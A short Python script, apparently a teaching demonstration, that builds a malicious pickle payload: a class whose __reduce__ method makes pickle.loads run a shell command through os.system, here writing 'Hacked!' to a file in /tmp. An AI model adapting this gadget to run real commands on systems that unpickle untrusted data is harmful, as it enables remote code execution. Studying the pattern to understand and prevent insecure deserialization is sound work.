import pickle
import os

class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo "Hacked!" > /tmp/hacked.txt',))

def serialize_and_deserialize():
    data = pickle.dumps(EvilClass())
    pickle.loads(data)

serialize_and_deserialize()
